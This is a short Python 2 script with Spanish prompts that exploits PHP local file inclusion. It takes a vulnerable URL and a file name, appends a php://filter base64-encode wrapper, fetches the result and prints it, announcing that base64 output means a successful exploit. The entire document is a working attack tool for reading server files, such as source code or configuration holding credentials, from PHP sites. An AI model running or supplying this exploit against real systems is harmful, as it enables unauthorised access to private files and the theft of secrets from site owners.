#!/usr/bin/python

import urllib

link = raw_input("Ingrese el Link vulnerable: ")
archivo = raw_input("Ingrese el archivo: ")

filtro = "php://filter/convert.base64-encode/resource="

url = link + filtro + archivo

packet = urllib.urlopen(url).read()

print "Si ve un base64 es vulnerable y se exploto con exito"
print packet
